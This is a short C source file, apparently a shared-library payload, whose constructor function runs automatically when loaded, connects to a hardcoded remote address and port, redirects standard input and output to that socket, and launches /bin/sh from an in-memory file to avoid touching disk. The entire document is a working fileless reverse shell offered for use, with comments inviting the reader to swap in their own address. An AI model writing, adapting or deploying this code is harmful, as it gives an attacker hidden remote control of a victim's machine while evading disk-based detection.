
/* 

Author: Devil0x1

*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>

#define REMOTE_IP "10.17.68.193" // chnage to any 
#define REMOTE_PORT 1337 // this too 


__attribute__((constructor))
void init() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) { perror("socket"); return; }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REMOTE_PORT);
    addr.sin_addr.s_addr = inet_addr(REMOTE_IP);

    if(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect"); return;
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    int fd = memfd_create("memshell", MFD_CLOEXEC);
    if(fd == -1) { perror("memfd_create"); return; }

    const char *shell_path = "/bin/sh";
    int bin_fd = open(shell_path, O_RDONLY);
    if(bin_fd < 0) { perror("open"); return; }

    char buf[4096];
    ssize_t n;
    while((n = read(bin_fd, buf, sizeof(buf))) > 0) {
        if(write(fd, buf, n) != n) { perror("write"); return; }
    }
    close(bin_fd);

    lseek(fd, 0, SEEK_SET);

    char *const argv[] = { "sh", NULL };
    char *const envp[] = { NULL };

    if(fexecve(fd, argv, envp) == -1) {
        perror("fexecve");
        return;
    }
}
